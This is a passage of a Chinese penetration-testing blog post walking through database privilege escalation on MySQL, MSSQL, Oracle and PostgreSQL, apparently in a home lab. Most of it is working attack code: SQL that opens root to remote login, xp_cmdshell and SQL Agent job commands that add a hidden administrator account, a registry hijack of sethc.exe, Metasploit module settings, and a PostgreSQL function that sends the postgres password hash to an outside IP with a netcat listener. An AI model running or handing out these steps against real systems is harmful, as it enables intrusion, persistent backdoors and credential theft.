<h5 id="2-条件"><a href="#2-条件" class="headerlink" title="2.条件"></a>2.条件</h5><ol>
<li>root账户</li>
<li>secure_file_priv为空</li>
</ol>
<h5 id="3-开启外连"><a href="#3-开启外连" class="headerlink" title="3.开启外连"></a>3.开启外连</h5><p>MySql默认情况下是不允许外部远程连接root用户的，所以需要先使用webshell、Navicat HTTP通道、phpmyadmin等方式开启外连。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;root密码&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> OPTION;<br></code></pre></td></tr></table></figure>

<h5 id="4-MSF-UDF"><a href="#4-MSF-UDF" class="headerlink" title="4.MSF_UDF"></a>4.MSF_UDF</h5><p>MSF中有udf模块，dll中包含sys_exec()和sys_eval()两个函数，MSF只创建sys_exec()，sys_exec()不回显，所以还需要手工创建sys_eval()。</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/multi/mysql/mysql_udf_payload	<br><span class="hljs-keyword">set</span> ...<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname &quot;nqCFiHBv.dll&quot;;	# 创建sys_eval函数<br><span class="hljs-keyword">select</span> sys_eval(&quot;whoami&quot;);	# 命令执行<br></code></pre></td></tr></table></figure>

<h5 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h5><p>MSF中的dll自定义的函数是用来执行命令的，还可以其他dll来创建用来反弹shell的函数。</p>
<p>可用使用暗月MYSQL高版本提权工具进行反弹shell。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43801718/article/details/105493042?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_43801718/article/details/105493042?spm=1001.2014.3001.5501</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83">https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83</a></p>
<h4 id="2-启动项提权"><a href="#2-启动项提权" class="headerlink" title="2.启动项提权"></a>2.启动项提权</h4><p>MySql的文件写入功能 -&gt; 写入后门到启动项目录中 -&gt; 目标机器重启，执行后门，反弹shell</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">MSF -&gt; use exploit<span class="hljs-regexp">/windows/my</span>sql/mysql_start_up<br></code></pre></td></tr></table></figure>

<h4 id="3-MOF提权"><a href="#3-MOF提权" class="headerlink" title="3.MOF提权"></a>3.MOF提权</h4><p>MOF -&gt; 成功几率很小 2003</p>
<p>原理：C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">MSF -&gt; use exploit<span class="hljs-regexp">/windows/my</span>sql/mysql_mof<br></code></pre></td></tr></table></figure>

<h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h4><p>MySQL提权共3种方法，其实还是一种方法 -&gt; 利用MySQL文件写入的功能，所以限制就比较明显 -&gt; 文件写入的权限&amp;写入任意路径的权限。</p>
<h4 id="5-实操"><a href="#5-实操" class="headerlink" title="5.实操"></a>5.实操</h4><h5 id="1-UDF"><a href="#1-UDF" class="headerlink" title="1.UDF"></a>1.UDF</h5><h6 id="1-信息收集-1"><a href="#1-信息收集-1" class="headerlink" title="1.信息收集"></a>1.信息收集</h6><p>webshell连接数据库：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201206945.png" srcset="/img/loading.gif" lazyload alt="image-20230131201206945"></p>
<p>查看是否可写入文件？</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>可以看到 <code>secure_file_priv</code> 为空，满足条件，可以提权。</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201237872.png" srcset="/img/loading.gif" lazyload alt="image-20230131201237872"></p>
<h6 id="2-开启外连"><a href="#2-开启外连" class="headerlink" title="2.开启外连"></a>2.开启外连</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;root&#x27; WITH GRANT OPTION;	# 开启外连<br><br>SELECT * FROM mysql.user LIMIT 0,10;	# 查看<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131173915674.png" srcset="/img/loading.gif" lazyload alt="image-20230131173915674"></p>
<h6 id="3-MSF"><a href="#3-MSF" class="headerlink" title="3.MSF"></a>3.MSF</h6><p>use exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload</p>
<p>set RHOSTS 43.139.185.135</p>
<p>set PASSWORD root</p>
<p>run</p>
<p>No such file or directory，需要手工创建。使用MSF报错出路径再创建比较方便。</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202324155.png" srcset="/img/loading.gif" lazyload alt="image-20230131202324155"></p>
<p>webshell创建文件夹：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201842453.png" srcset="/img/loading.gif" lazyload alt="image-20230131201842453"></p>
<p>run</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202558414.png" srcset="/img/loading.gif" lazyload alt="image-20230131202558414"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202632942.png" srcset="/img/loading.gif" lazyload alt="image-20230131202632942"></p>
<p>创建sys_eval：</p>
<p>create function sys_eval returns string soname “nqCFiHBv.dll”;	# 创建sys_eval函数</p>
<p>select sys_eval(“whoami”);	# 命令执行</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202806186.png" srcset="/img/loading.gif" lazyload alt="image-20230131202806186"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202829764.png" srcset="/img/loading.gif" lazyload alt="image-20230131202829764"></p>
<p>由于是phpstudy搭建的环境，所以权限是phpstudy获得的权限 -&gt; administrator，而不是system权限。</p>
<h6 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h6><p>dll文件中存在反弹shell的函数，从而实现反弹。</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83">https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83</a></p>
<p>工具：暗月MYSQL高版本提权工具</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201171614280.png" srcset="/img/loading.gif" lazyload alt="image-20230201171614280"></p>
<h5 id="2-启动项"><a href="#2-启动项" class="headerlink" title="2.启动项"></a>2.启动项</h5><p>use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up</p>
<p>set USERNAME root</p>
<p>set PASSWORD root</p>
<p>set RHOSTS 43.139.185.135</p>
<p>set DISABLEPAYLOADHANDLER false </p>
<p>run</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131222319329.png" srcset="/img/loading.gif" lazyload alt="image-20230131222319329"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131222059289.png" srcset="/img/loading.gif" lazyload alt="image-20230131222059289"></p>
<h3 id="2-MSSQL"><a href="#2-MSSQL" class="headerlink" title="2.MSSQL"></a>2.MSSQL</h3><p>前提条件：sa用户</p>
<h4 id="1-xp-cmdshell"><a href="#1-xp-cmdshell" class="headerlink" title="1.xp_cmdshell"></a>1.xp_cmdshell</h4><p>xp_cmdshell -&gt; 可以执行系统命令</p>
<p>开启xp_cmdshell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;, 1RECONFIGURE;<br>EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure>

<p>执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;;<br></code></pre></td></tr></table></figure>

<h4 id="2-sp-oacreate"><a href="#2-sp-oacreate" class="headerlink" title="2.sp_oacreate"></a>2.sp_oacreate</h4><p><code>sp_oacreate</code>可以删除、复制、移动文件，还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>。</p>
<p><code>sp_oacreate</code>和<code>sp_oamethod</code>两个过程分别用来创建和执行脚本语言，换言之就是<code>xp_cmdshell</code>能执行的<code>sp_oacreate</code>＋<code>sp_oamethod</code>同样能胜任。但是使用此方法时<code>sp_oacreate</code>没有回显，所以一般用于<code>xp_cmdshell</code>无法使用时。</p>
<p>开启组件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;,1;<br>RECONFIGURE;EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure>

<p>调用cmd.exe执行命令并写入到test.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod <br>@shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;d:/test.txt&#x27;<br></code></pre></td></tr></table></figure>

<h4 id="3-沙盒"><a href="#3-沙盒" class="headerlink" title="3.沙盒"></a>3.沙盒</h4><p>原理：本质是修改注册表，默认情况下，注册表中<code>mdb</code>数据库不允许执行系统命令，但是开启沙盒模式，就准许<code>mdb</code>文件执行数据库，通过查询方式调用<code>mdb</code>文件，执行参数，绕过系统本身自己的执行命令，实现<code>mdb</code>文件执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;<br>exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;<br>--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。<br>exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;<br>--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。<br>exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;;<br>--执行系统命令<br>select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user qianxun 123456 /add&quot;)&#x27;)<br>select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators qianxun /add&quot;)&#x27;)<br><br>-- 恢复配置<br>exec master..xp_regwrite &#x27;HKEY_LOCALMACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;<br>exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;<br>exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;<br></code></pre></td></tr></table></figure>

<h4 id="4-JOB"><a href="#4-JOB" class="headerlink" title="4.JOB"></a>4.JOB</h4><p>原理是创建一个任务x，并执行命令，命令执行后的结果，将返回给文档q.txt</p>
<p>首先需要启动sqlagent服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master.dbo.xp_servicecontrol &#x27;start&#x27;,&#x27;SQLSERVERAGENT&#x27;<br></code></pre></td></tr></table></figure>

<p>然后创建任务X，这里x为任务名称，并执行命令，命令执行后的结果，将返回给文本文档q.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">use msdb<br>exec sp_delete_job null,&#x27;x&#x27;<br>exec sp_add_job &#x27;x&#x27;<br>exec sp_add_jobstep null,&#x27;x&#x27;,null,&#x27;1&#x27;,&#x27;cmdexec&#x27;,&#x27;cmd /c &quot;net user hack1 hack1 /add &amp;net localgroup administrators hack1 /add&gt;c:/q.txt&quot;&#x27;<br>exec sp_add_jobserver null,&#x27;x&#x27;,@@servername<br>exec sp_start_job &#x27;x&#x27;;<br></code></pre></td></tr></table></figure>

<h4 id="5-映像劫持"><a href="#5-映像劫持" class="headerlink" title="5.映像劫持"></a>5.映像劫持</h4><p>利用regwrite函数修改注册表，起到劫持作用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mssql">-- 查看xp_regwrite是否启用<br>select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_regwrite&#x27;<br>-- 开启regwrite<br>EXEC sp_configure &#x27;show advanced options&#x27;, 1<br>RECONFIGURE<br>EXEC sp_configure &#x27;xp_regwrite&#x27;,1<br>RECONFIGURE<br>-- 利用regwrite函数修改注册表进行劫持<br>EXEC master..xp_regwrite @rootkey=&#x27;HKEY_LOCAL_MACHINE&#x27;,@key=&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;,@value_name=&#x27;Debugger&#x27;,@type=&#x27;REG_SZ&#x27;,@value=&#x27;c:\windows\system32\cmd.exe&#x27;<br>-- 查看是否劫持成功<br>exec master..xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;Debugger&#x27;<br>-- 远程连接桌面，连续按五次shift就可调用cmd窗口<br></code></pre></td></tr></table></figure>

<h4 id="6-实操"><a href="#6-实操" class="headerlink" title="6.实操"></a>6.实操</h4><h5 id="1-xp-cmdshell-1"><a href="#1-xp-cmdshell-1" class="headerlink" title="1.xp_cmdshell"></a>1.xp_cmdshell</h5><p>Navicat连接，默认开启外连：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201172820986.png" srcset="/img/loading.gif" lazyload alt="image-20230201172820986"></p>
<p>EXEC sp_configure ‘show advanced options’, 1RECONFIGURE;<br>EXEC sp_configure ‘xp_cmdshell’, 1;<br>RECONFIGURE;</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201173044181.png" srcset="/img/loading.gif" lazyload alt="image-20230201173044181"></p>
<p>EXEC master.dbo.xp_cmdshell ‘whoami &#x2F;all’;</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201173241862.png" srcset="/img/loading.gif" lazyload alt="image-20230201173241862"></p>
<h5 id="2-sp-oacreate-1"><a href="#2-sp-oacreate-1" class="headerlink" title="2.sp_oacreate"></a>2.sp_oacreate</h5><p>EXEC sp_configure ‘show advanced options’,1;<br>RECONFIGURE;EXEC sp_configure ‘Ole Automation Procedures’,1;<br>RECONFIGURE;</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201174014723.png" srcset="/img/loading.gif" lazyload alt="image-20230201174014723"></p>
<p>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod<br>@shell,’run’,null,’c:\windows\system32\cmd.exe &#x2F;c whoami &gt;d:&#x2F;test.txt’</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201174305333.png" srcset="/img/loading.gif" lazyload alt="image-20230201174305333"></p>
<h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><p>其他方法无法成功，可能是安装出了问题或者没有权限。</p>
<h3 id="3-oracle"><a href="#3-oracle" class="headerlink" title="3.oracle"></a>3.oracle</h3><p>java一般是system权限运行，所以oracle一般直接得到最高权限。</p>
<p>工具：oracleShell</p>
<p>地址：<a target="_blank" rel="noopener" href="https://github.com/jas502n/oracleShell">https://github.com/jas502n/oracleShell</a></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201182018938.png" srcset="/img/loading.gif" lazyload alt="image-20230201182018938"></p>
<h3 id="4-PostgreSQL"><a href="#4-PostgreSQL" class="headerlink" title="4.PostgreSQL"></a>4.PostgreSQL</h3><p>PostgreSQL提权主要是靠2个Nday：</p>
<ol>
<li>CVE-2018-1058 PostgreSQL 提权漏洞 -&gt; 普通用户连接到数据库—&gt;注入危险代码—&gt;等待超级用户登录触发后门—&gt;收到敏感信息</li>
<li>CVE-2019-9193 高级权限命令执行漏洞</li>
</ol>
<p>登录：psql –host your-ip –username vulhub</p>
<h4 id="1-CVE-2018-1058"><a href="#1-CVE-2018-1058" class="headerlink" title="1.CVE-2018-1058"></a>1.CVE-2018-1058</h4><p>影响版本：9.3到10</p>
<p>普通用户连接到数据库—&gt;注入危险代码—&gt;等待超级用户登录触发后门—&gt;收到敏感信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> public.array_to_string(anyarray,text) <span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span> $$<br>    <span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=IP地址 port=端口 user=postgres password=chybeta sslmode=disable dbname=&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>))); <br>    <span class="hljs-keyword">SELECT</span> pg_catalog.array_to_string($<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>);<br>$$ <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-keyword">SQL</span> VOLATILE;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc lvvp 端口<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q943111495/article/details/121032338">https://blog.csdn.net/q943111495/article/details/121032338</a> </p>
<h4 id="2-CVE-2019-9193"><a href="#2-CVE-2019-9193" class="headerlink" title="2.CVE-2019-9193"></a>2.CVE-2019-9193</h4><p>从9.3版本开始，Postgres新增了一个<code>COPY TO/FROM PROGRAM</code>功能，允许数据库的超级用户以及<code>pg_read_server_files</code>组中的任何用户执行操作系统命令。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> cmd_exec(cmd_output text);<br><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;id&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cmd_exec;<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1472565">https://cloud.tencent.com/developer/article/1472565</a></p>
<h4 id="3-实操"><a href="#3-实操" class="headerlink" title="3.实操"></a>3.实操</h4><h5 id="1-CVE-2018-1058-1"><a href="#1-CVE-2018-1058-1" class="headerlink" title="1.CVE-2018-1058"></a>1.CVE-2018-1058</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> public.array_to_string(anyarray,text) <span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span> $$<br>    <span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=43.140.192.244 port=4444 user=postgres password=chybeta sslmode=disable dbname=&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>))); <br>    <span class="hljs-keyword">SELECT</span> pg_catalog.array_to_string($<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>);<br>$$ <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-keyword">SQL</span> VOLATILE;<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201190453256.png" srcset="/img/loading.gif" lazyload alt="image-20230201190453256"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201190544182.png" srcset="/img/loading.gif" lazyload alt="image-20230201190544182"></p>
<h5 id="2-CVE-2019-9193-1"><a href="#2-CVE-2019-9193-1" class="headerlink" title="2.CVE-2019-9193"></a>2.CVE-2019-9193</h5><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201191002084.png" srcset="/img/loading.gif" lazyload alt="image-20230201191002084"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
  
  
    <span>></span>
    
  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>windows 提权</div>
      <div>https://fuyoumingyan.github.io/2023/07/22/内网渗透/windows权限提升/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>fuming</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年7月22日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/08/13/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/CobaltStrike/" title="Cobalt Strike">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Cobalt Strike</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="linux 提权">
                        <span class="hidden-mobile">linux 提权</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


